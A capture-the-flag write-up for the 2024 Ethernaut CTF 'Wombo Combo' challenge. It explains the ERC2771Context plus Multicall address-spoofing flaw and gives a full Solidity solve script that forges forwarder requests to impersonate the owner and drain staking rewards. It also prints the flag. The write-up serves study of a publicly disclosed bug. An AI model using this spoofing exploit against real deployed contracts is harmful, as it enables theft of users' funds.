---
title: Blockchain - Wombo Combo
description: 2024 | Ethernaut CTF | easy-solidity
tags:
    - smart contract
    - solidity
    - multicall
---

## Description

You should stake your tokens to get more tokens!

> [Challenge Files](https://github.com/OpenZeppelin/ctf-2024/blob/0527d0e1ea6d729faf753057af6f24cc89584b4e/wombocombo/challenge/project/src/Challenge.sol)

## Solution

- To solve the challenge, we need to obtain enough rewards from the Staking contract and transfer reward tokens to `address(0x123)`
- The Staking contract inherits from Multicall and ERC2771Context
- The ERC2771Context overrides the `msgSender()` so that the actual caller will be the last 20 bytes of the call data if calls originating from a trusted forwarder

    ```js
    function _msgSender() internal view virtual override returns (address sender) {
        if (isTrustedForwarder(msg.sender)) {
            // The assembly code is more direct than the Solidity version using `abi.decode`.
            assembly {
                sender := shr(96, calldataload(sub(calldatasize(), 20)))
            }
        } else {
            return super._msgSender();
        }
    }
    ```

- The `multicall()` function can batch multiple calls in a single external call with user-provided data, which can be combined with the forwarder to impersonate any user calling the Staking contract


    ```js
    function multicall(bytes[] calldata data) external returns (bytes[] memory results) {
        results = new bytes[](data.length);
        for (uint256 i = 0; i < data.length; i++) {
            results[i] = Address.functionDelegateCall(address(this), data[i]);
        }
        return results;
    }
    ```

- The user's reward is related to `rewardRate` and is only updated in `notifyRewardAmount()` which can only be called by the owner
- We can first stake some tokens, impersonate the owner to increase the `rewardRate`, and then obtain enough rewards to solve the challenge :>

### Exploitation

Run the script twice to give some time to accumulate rewards:

1. Stake and impersonate the owner to notify the reward amount
2. Get reward tokens and transfer them to `address(0x123)`

```js
contract Solve is CTFSolver {
    function solve(address _challenge, address player) internal override {
        Challenge challenge = Challenge(_challenge);
        Forwarder forwarder = challenge.forwarder();
        Staking staking = challenge.staking();
        Token token = staking.stakingToken();
        Token reward = staking.rewardsToken();
        uint priv = vm.envUint("PLAYER");

        if (staking.totalSupply() > 0) {
            staking.getReward();
            reward.transfer(address(0x123), reward.balanceOf(player));
            return;
        }

        token.approve(address(staking), token.totalSupply());
        staking.stake(token.totalSupply());

        bytes[] memory data = new bytes[](1);

        data[0] = abi.encodePacked(
            staking.notifyRewardAmount.selector,
            uint256(100_000_000 ether),
            staking.owner()
        );

        Forwarder.ForwardRequest memory req = Forwarder.ForwardRequest(
            player, // from
            address(staking),   // to
            0,  // value
            300000, // gas
            0,  // nonce
            block.timestamp + 1 minutes,  // deadline
            abi.encodeCall(
                staking.multicall,
                (data)
            )
        );

        bytes32 separator = keccak256(
            abi.encode(
                keccak256(
                    "EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"
                ),
                keccak256(bytes("Forwarder")),
                keccak256(bytes("1")),
                block.chainid,
                address(forwarder)
            )
        );
        bytes32 forwarderTypeHash = keccak256(
            "ForwardRequest(address from,address to,uint256 value,uint256 gas,uint256 nonce,uint256 deadline,bytes data)"
        );
        bytes32 digest = ECDSA.toTypedDataHash(
            separator,
            keccak256(
                abi.encode(
                    forwarderTypeHash,
                    req.from,
                    req.to,
                    req.value,
                    req.gas,
                    req.nonce,
                    req.deadline,
                    keccak256(req.data)
                )
            )
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(priv, digest);
        bytes memory signature = abi.encodePacked(r, s, v);

        forwarder.execute(req, signature);
    }
}
```

### Flag

> OZCTF{M3t4_Tr4NS4ct10nS_aR4_n0T_S0_m3Ta}

## References

- [Arbitrary Address Spoofing Attack: ERC2771Context Multicall Public Disclosure](https://blog.openzeppelin.com/arbitrary-address-spoofing-vulnerability-erc2771context-multicall-public-disclosure)
